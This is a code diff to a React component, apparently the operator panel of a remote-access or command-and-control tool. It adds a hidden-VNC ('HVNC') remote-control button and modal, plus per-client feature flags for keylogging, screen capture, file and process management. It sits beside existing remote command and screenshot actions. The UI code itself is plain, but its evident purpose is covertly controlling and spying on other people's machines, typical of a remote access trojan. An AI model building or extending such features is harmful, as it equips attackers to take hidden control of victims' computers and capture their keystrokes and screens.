@@ -1,7 +1,8 @@
 import React, { useState } from 'react';
-import { FiCamera, FiPower, FiRefreshCw, FiInfo, FiSend } from 'react-icons/fi';
+import { FiCamera, FiPower, FiRefreshCw, FiInfo, FiSend, FiMonitor } from 'react-icons/fi';
 import toast from 'react-hot-toast';
 import { API_URL } from '../../config';
+import HvncModal from '../../components/HvncModal';
 
 interface Client {
   id: string;
@@ -15,6 +16,13 @@ interface Client {
   uuid?: string;
   systemInfo?: any;
   lastSeen?: string;
+  features?: {
+    hvnc?: boolean;
+    keylogger?: boolean;
+    screenCapture?: boolean;
+    fileManager?: boolean;
+    processManager?: boolean;
+  };
 }
 
 interface ClientDetailsProps {
@@ -25,6 +33,7 @@ interface ClientDetailsProps {
 const ClientDetails: React.FC<ClientDetailsProps> = ({ client, onCommandSent }) => {
   const [customCommand, setCustomCommand] = useState('');
   const [isExecuting, setIsExecuting] = useState(false);
+  const [isHvncOpen, setIsHvncOpen] = useState(false);
 
   if (!client) {
     return (
@@ -129,7 +138,18 @@ const ClientDetails: React.FC<ClientDetailsProps> = ({ client, onCommandSent }) 
       {/* Quick Actions */}
       <div className="mb-6">
         <h3 className="text-lg font-semibold text-black dark:text-white mb-3">Quick Actions</h3>
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
+          {client.features?.hvnc && (
+            <button
+              onClick={() => setIsHvncOpen(true)}
+              disabled={getClientStatus() !== 'online'}
+              className="flex items-center justify-center space-x-2 px-4 py-2 bg-purple-600 hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg transition-colors"
+              title="Open HVNC Remote Control"
+            >
+              <FiMonitor className="w-4 h-4" />
+              <span className="text-sm">HVNC</span>
+            </button>
+          )}
           <button
             onClick={() => handleQuickCommand('screenshot')}
             disabled={isExecuting || getClientStatus() !== 'online'}
@@ -214,6 +234,16 @@ const ClientDetails: React.FC<ClientDetailsProps> = ({ client, onCommandSent }) 
             </pre>
           </div>
         </div>
+      )}
+
+      {/* HVNC Modal */}
+      {(client.id || client.uuid) && (
+        <HvncModal
+          agentId={client.id || client.uuid || ''}
+          platform={getClientOS()}
+          isOpen={isHvncOpen}
+          onClose={() => setIsHvncOpen(false)}
+        />
       )}
     </div>
   );
